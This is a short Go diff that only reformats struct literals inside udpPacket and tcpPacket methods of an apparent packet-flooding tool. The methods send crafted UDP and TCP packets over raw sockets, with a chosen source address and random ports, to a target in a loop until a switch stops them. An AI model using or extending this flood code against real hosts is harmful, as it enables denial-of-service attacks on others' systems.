@@ -84,7 +84,9 @@ func (a *Attack) udpPacket() {
 	}
 	conn := rawSocket(syscall.IPPROTO_UDP)
 	for {
-		udp := a.setupUDP(&net.UDPAddr{IP: net.ParseIP(a.srcAddr), Port: rand.Intn(65535)}, dst)
+		udp := a.setupUDP(&net.UDPAddr{
+			IP:   net.ParseIP(a.srcAddr),
+			Port: rand.Intn(65535)}, dst)
 		conn.WriteTo(udp, &net.IPAddr{IP: dst.IP})
 		if AttackSwitch {
 			break
@@ -99,7 +101,9 @@ func (a *Attack) tcpPacket() {
 	}
 	conn := rawSocket(syscall.IPPROTO_TCP)
 	for {
-		tcp := a.setupTCP(&net.TCPAddr{IP: net.ParseIP(a.srcAddr), Port: rand.Intn(65535)}, dst)
+		tcp := a.setupTCP(&net.TCPAddr{
+			IP:   net.ParseIP(a.srcAddr),
+			Port: rand.Intn(65535)}, dst)
 		conn.WriteTo(tcp, &net.IPAddr{IP: dst.IP})
 		if AttackSwitch {
 			break
